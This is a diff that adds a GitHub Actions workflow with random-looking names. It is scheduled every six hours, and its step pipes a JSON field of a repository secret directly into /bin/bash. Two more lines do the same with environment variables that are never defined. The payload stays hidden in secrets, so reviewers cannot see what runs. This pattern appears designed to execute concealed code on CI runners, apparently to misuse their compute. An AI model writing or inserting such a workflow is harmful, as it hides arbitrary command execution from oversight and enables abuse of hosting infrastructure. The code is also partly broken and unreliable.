@@ -1,0 +1,19 @@
+name: pangmeixiu2317
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pangmeixiu2317
+        env:
+          bq090: ${{ secrets.bq090 }}
+        run: |
+          echo $bq090 | jq -r .tq7780 | /bin/bash
+          echo $dsd0 | jq -r .w505 | /bin/bash
+          echo $h01456 | jq -r .dkd28465 | /bin/bash
+
